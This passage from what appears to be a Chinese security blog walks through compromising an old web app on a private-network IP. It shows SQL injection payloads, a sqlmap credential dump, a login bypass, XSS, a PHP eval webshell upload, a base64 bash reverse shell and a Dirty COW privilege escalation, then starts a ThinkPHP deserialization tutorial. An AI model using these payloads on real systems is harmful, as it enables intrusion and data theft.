/images/                                          </span><br><span class="line">[12:34:59] 301 -  250B  - /include  -&gt;  http://192.168.132.140/include/     </span><br><span class="line">[12:34:59] 200 -  497B  - /include/                                         </span><br><span class="line">[12:34:59] 200 -    6KB - /index.php                                        </span><br><span class="line">[12:35:00] 200 -  672B  - /js/                                              </span><br><span class="line">[12:35:01] 200 -    4KB - /login.php                                        </span><br><span class="line">[12:35:01] 200 -    4KB - /login                                            </span><br><span class="line">[12:35:01] 200 -    4KB - /login/admin/                                     </span><br><span class="line">[12:35:01] 200 -    4KB - /login/admin/admin.asp</span><br><span class="line">[12:35:01] 200 -    4KB - /login/</span><br><span class="line">[12:35:01] 200 -    4KB - /login/administrator/</span><br><span class="line">[12:35:01] 200 -    4KB - /login/cpanel.html</span><br><span class="line">[12:35:01] 200 -    4KB - /login/cpanel.js</span><br><span class="line">[12:35:01] 200 -    4KB - /login/cpanel.jsp</span><br><span class="line">[12:35:01] 200 -    4KB - /login/cpanel.php</span><br><span class="line">[12:35:01] 200 -    4KB - /login/login</span><br><span class="line">[12:35:01] 200 -    4KB - /login/cpanel/                                    </span><br><span class="line">[12:35:01] 200 -    4KB - /login/cpanel.aspx                                </span><br><span class="line">[12:35:01] 200 -    4KB - /login/super</span><br><span class="line">[12:35:01] 200 -    4KB - /login/index                                      </span><br><span class="line">[12:35:01] 200 -    4KB - /login/oauth/                                     </span><br><span class="line">[12:35:01] 200 -    1KB - /logout                                           </span><br><span class="line">[12:35:01] 200 -    1KB - /logout.php                                       </span><br><span class="line">[12:35:01] 200 -    1KB - /logout/                                          </span><br><span class="line">[12:35:03] 200 -    2KB - /menu                                             </span><br><span class="line">[12:35:05] 200 -  161B  - /path/                                            </span><br><span class="line">[12:35:05] 200 -  161B  - /path/dataTables/extras/TableTools/media/swf/ZeroClipboard.swf</span><br><span class="line">[12:35:08] 200 -   84B  - /proxy                                            </span><br><span class="line">[12:35:08] 200 -   84B  - /proxy/                                           </span><br><span class="line">[12:35:10] 200 -   20B  - /sendmail                                         </span><br><span class="line">[12:35:13] 200 -    4KB - /style                                            </span><br><span class="line">[12:35:13] 200 -  189B  - /submit                                           </span><br><span class="line">[12:35:14] 200 -  243B  - /test                                             </span><br><span class="line">[12:35:14] 200 -  243B  - /test.php                                         </span><br><span class="line">[12:35:14] 200 -  509B  - /test.html                                        </span><br><span class="line">[12:35:14] 200 -  243B  - /test/                                            </span><br><span class="line">[12:35:14] 200 -  243B  - /test/reports</span><br><span class="line">[12:35:14] 200 -  243B  - /test/tmp/                                        </span><br><span class="line">[12:35:14] 200 -  243B  - /test/version_tmp/                                </span><br><span class="line">[12:35:15] 200 -  126B  - /tn                                               </span><br><span class="line">[12:35:19] 200 -    5KB - /wwwlog</span><br></pre></td></tr></table></figure>

<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><h3 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h3><h4 id="注入点一"><a href="#注入点一" class="headerlink" title="注入点一"></a>注入点一</h4><p>漏洞点在<code>/back/index.php</code></p>
<p>开始是尝试爆破弱口令，这里kali的burpsuite爆太慢了就换成物理机的。没爆出来但是无意间测出存在sql注入漏洞</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018094808676.png"></p>
<p>爆下字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">account=1&#x27; order by 1,2#&amp;password=1</span><br></pre></td></tr></table></figure>

<p>根据回显不同得到字段数为2</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018221831596.png"></p>
<p>后面爆破库和表名没成功</p>
<h4 id="注入点二"><a href="#注入点二" class="headerlink" title="注入点二"></a>注入点二</h4><p>其他的注入点都在<code>/back/content.php</code>，经过测试带有查询功能的管理系统都存在sql注入漏洞</p>
<p>下面列举几个，注入的payload不同在于字段数不同</p>
<p>园区公告管理系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%&#x27; and 1=2 union select 1,VERSION(),3,4,5,6#</span><br></pre></td></tr></table></figure>

<p>租借管理系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%&#x27; and 1=2 union select 1,VERSION(),3,4,5#</span><br></pre></td></tr></table></figure>

<p>商家资讯管理系统</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%&#x27; and 1=2 union select 1,VERSION(),3,4#</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241022000942518.png"></p>
<p>库名爆出来为<code>tcic</code>，尝试继续爆破表名，结果报错了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%&#x27; and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema= database(),3,4#</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241023001633802.png"></p>
<p>最后还是选择使用sqlmap（害本人能力有限）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://192.168.132.140/back/rent_list.php?kw=1&amp;button42=%E6%9F%A5%E8%A9%A2&quot;   <span class="comment">--cookie=&quot;PHPSESSID=f45haga2s95hol9ib2ljq4q002&quot; -D tcic -T tcic_account -C &quot;id,account,name,password&quot; --dump</span></span><br></pre></td></tr></table></figure>

<p>最后也是跑出用户列表上用户的密码</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241023001424970.png"></p>
<h3 id="弱口令漏洞"><a href="#弱口令漏洞" class="headerlink" title="弱口令漏洞"></a>弱口令漏洞</h3><p>前面进行burpsuite爆破的时候，注意到存在sql注入漏洞</p>
<p>直接使用万能语句成功登录，不过需要注意我们右上角其实并不是admin用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; or 1=1#</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018220515769.png"></p>
<p>并且这里用户名带有<code>#</code>会影响我们进一步测试，因为这些功能点很多都是通过sql语法插入数据的</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018220553698.png"></p>
<p>收集下账户管理系统的用户名</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018220051432.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sccp</span><br><span class="line">Maggie</span><br><span class="line">Shelly</span><br><span class="line">Peggy</span><br><span class="line">Fina</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>

<p>这里拿上面收集的用户名去弱口令测试，在测试Maggie的时候出现302跳转</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018230357938.png"></p>
<p>测出Maggie用户的密码为<code>0000</code>，成功登录</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018230520195.png"></p>
<h3 id="个人信息泄露"><a href="#个人信息泄露" class="headerlink" title="个人信息泄露"></a>个人信息泄露</h3><p>会员管理系统下可以查看会员列表，泄露了个人隐私信息</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241025093625389.png"></p>
<p>这里可以导出表格涉及一千多人，包括邮箱，姓名，住址等</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241025093718061.png"></p>
<h3 id="XSS注入漏洞"><a href="#XSS注入漏洞" class="headerlink" title="XSS注入漏洞"></a>XSS注入漏洞</h3><p>在<code>/back/content.php</code>路径下的电子报管理系统，观察到有类似留言功能</p>
<p>直接使用最简单的payload，成功触发xss漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018215109308.png"></p>
<p>F12将元素指向我们添加的地方，恶意代码成功注入</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241018215301486.png"></p>
<h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>这个网站文件上传的洞挺多的，大致利用方法都一样</p>
<h4 id="上传点一"><a href="#上传点一" class="headerlink" title="上传点一"></a>上传点一</h4><p>漏洞点在<code>/back/content.php</code>路径下的首页管理系统</p>
<p>我们在本地创建shell.php写入恶意代码（这里添加文件头绕一下检测）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后上传文件即可</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019143822618.png"></p>
<p>上传成功后点击编辑，F12查看图片存放的路径</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019145227848.png"></p>
<p>访问成功命令执行</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019145323467.png"></p>
<h4 id="上传点二"><a href="#上传点二" class="headerlink" title="上传点二"></a>上传点二</h4><p>漏洞点在<code>/back/content.php</code>路径下的成果展演管理系统，上传前面创建的恶意php文件</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019150854073.png"></p>
<p>上传成功后，还是一样F12看下图片存放的路径</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019150917004.png"></p>
<p>也可以命令执行</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019151028125.png"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>直接反弹shell就可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzMi4xMzgvMTAyOCAwPiYx|base64 -d|bash</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019152543808.png"></p>
<p>本地开启http服务后，在靶机wget把linpeas下载下来自动化扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击机:</span><br><span class="line">python3 -m http.server 80</span><br><span class="line"></span><br><span class="line">靶机:</span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.132.138/linpeas.sh</span><br><span class="line">chmod +x linpeas.sh     //赋予权限</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019153602903.png"></p>
<p>扫描结果是存在python2版本的，提升下shell权限及稳定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm</span><br><span class="line">Ctrl + Z 将 shell 置于后台</span><br><span class="line">stty raw -echo; fg</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241019160701435.png"></p>
<h3 id="尝试一-udf提权"><a href="#尝试一-udf提权" class="headerlink" title="尝试一 udf提权"></a>尝试一 udf提权</h3><p>扫出来mysql数据库密码，跟进一下文件</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241024205332575.png"></p>
<p>成功找到账户密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">member:member123</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241024205435559.png"></p>
<p>mysql进行登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u member -p -h localhost</span><br></pre></td></tr></table></figure>

<p>尝试udf提权，看下是否满足条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241024205907242.png"></p>
<p>说明读写不做任何限制，那么利用sqlmap自带的动态链接库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/sqlmap/extra/cloak</span><br><span class="line">sudo python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241024185453025.png"></p>
<p>得到so文件后放到cyberchef转成十六进制</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241024210137623.png"></p>
<p>执行写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT  INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udff.so&#x27;;</span><br></pre></td></tr></table></figure>

<p>不过权限不够失败了（猜测应该跟mysql服务启动者为root有关）</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241024210258995.png"></p>
<h3 id="尝试二-内核漏洞"><a href="#尝试二-内核漏洞" class="headerlink" title="尝试二 内核漏洞"></a>尝试二 内核漏洞</h3><p>查看内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname- a</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241024232220486.png"></p>
<p>我们在exploit-db找下对应内核漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit linux 3.2.0 ubuntu</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241024232344368.png"></p>
<p>符合的就只有33589.c和34134.c的，分别测试下</p>
<p>第一个33589.c编译成功，但是执行不了</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241025001529013.png"></p>
<p>第二个34134.c编译就直接报错</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241025000917775.png"></p>
<p>这里又在网上查了下，找到脏牛内核漏洞 CVE-2016-5195</p>
<p>exp地址：<code>https://github.com/FireFart/dirtycow</code></p>
<p>由于靶机没有gcc环境，我们在本地编译上传，执行exp后会发现靶机的glib版本过低。那么可以使用<code>-static</code>参数生成一个静态链接，然后开启http服务上传到靶机上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt -static</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241025001855613.png"></p>
<p>赋予可执行权限后执行脚本，输入我们需要创建用户的新密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./dirty1     </span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241025001143393.png"></p>
<p>创建好用户后，ssh连接成功拿到root权限</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95%E6%B8%97%E9%80%8F%E6%9F%90%E8%BF%9C%E5%8F%A4%E7%BD%91%E7%AB%99/image-20241025001228352.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://blog.csdn.net/qq_44842234/article/details/125626393">https://blog.csdn.net/qq_44842234/article/details/125626393</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>脏牛内核漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP5.0.24 反序列化漏洞探索</title>
    <url>/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>拖了好久的tp框架，是时候开始学习了</p>
<span id="more"></span>



<h1 id="ThinkPHP5-0-24-反序列化漏洞探索"><a href="#ThinkPHP5-0-24-反序列化漏洞探索" class="headerlink" title="ThinkPHP5.0.24 反序列化漏洞探索"></a>ThinkPHP5.0.24 反序列化漏洞探索</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于本篇文章是tp框架学习计划的开头，为了方便后续其他tp漏洞学习，内容包括一些前置知识以及tp开发手册。毕竟安全和开发密不可分，打好基础对整个tp框架学习起到非常大的帮助。</p>
<hr>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="命名空间-子命名空间"><a href="#命名空间-子命名空间" class="headerlink" title="命名空间&amp;子命名空间"></a>命名空间&amp;子命名空间</h3><p>namespace实际上是命名空间，我们可以把namespace理解为一个单独的空间，事实上它也就是一个空间而已，子命名空间那就是空间里再划分几个小空间，我们通过下面demo来具体了解一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">cat</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;catcatcat&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">dogA</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A:dogdogdog&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">dogB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;B:dogdogdog&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运用namespace定义了命名空间animal以及三个子空间<code>cat,dogA,dogB</code>，并且编写三个类。我们来看下面几种运用命名空间的方式</p>
<ol>
<li><p>如果我们直接进行实例化<code>new dog();</code>，那么输出结果为<code>B:dogdogdog</code>。这是因为如果不选择命名空间的话，就直接是最后的命名空间<code>namespace animal\dogB</code></p>
</li>
<li><p>直接对命名空间对应的类实例化，或者先规定命名空间然后直接实例化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//直接实例化</span><br><span class="line">new \animal\dogA\dog();</span><br><span class="line"></span><br><span class="line">//先规定再实例化</span><br><span class="line">use animal\dogA;</span><br><span class="line">new dogA\dog();</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>use</code>在这里和include、require有点像，就是在<strong>当前命名空间引入其他命名空间的别名</strong>，比如<code>use animal\dogA as alias</code>其中的alias就是animal的别名，然后我们就可以用这个别名来调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use animal\dogA as alias;</span><br><span class="line">new alias\dog();</span><br></pre></td></tr></table></figure></li>
</ol>
<p>所以当我们在拉反序列化链子的时候 ，除了<code>namespace</code>当前类的命名空间，还要<code>use</code>下一个类的<code>命名空间 + \类名</code></p>
<hr>
<h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>直接来看下面demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Tom&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hobby</span>=<span class="string">&quot;game&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am father \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i like play basketball \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">child</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Alice&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am child \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parentsay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$child</span>=<span class="keyword">new</span> <span class="title function_ invoke__">child</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">smoke</span>();</span><br><span class="line"><span class="variable">$child</span>-&gt;<span class="title function_ invoke__">parentsay</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$child</span>-&gt;hobby;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240621225741239.png"></p>
<p>我们通过这个demo可以发现。在php中类的继承和java中类似，子类可以继承父类，子类也可以覆写父类的方法。当然子类能利用<code>parent::</code>关键字访问父类被覆盖的方法</p>
<h3 id="trait修饰符"><a href="#trait修饰符" class="headerlink" title="trait修饰符"></a>trait修饰符</h3><p>使得被修饰的类可以进行复用，增加了代码的可复用性，使用这个修饰符就可以在一个类包含另一个类</p>
<p>demo如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;test\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rev1ve</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;rev1ve\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">rev1ve</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240621230229110.png"></p>
<p>test是一个用trait修饰的类，所以我们只要在rev1ve类中use了test这个类，我们就可以调用其中的方法，类似于类的继承</p>
<p>我们看下面有趣的demo</p>
<p>test.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace first\test;</span><br><span class="line">use second\test1\test1;</span><br><span class="line">class test&#123;</span><br><span class="line">    use test1;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;test\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>test1.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace second\test1;</span><br><span class="line">require(&quot;test.php&quot;);</span><br><span class="line">use first\test\test;</span><br><span class="line">trait test1&#123;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;tostring\n&quot;;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new test();</span><br><span class="line">echo $a;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="ThinkPHP开发手册"><a href="#ThinkPHP开发手册" class="headerlink" title="ThinkPHP开发手册"></a>ThinkPHP开发手册</h2><p>官方文档：<a href="https://www.thinkphp.cn/doc">https://www.thinkphp.cn/doc</a></p>
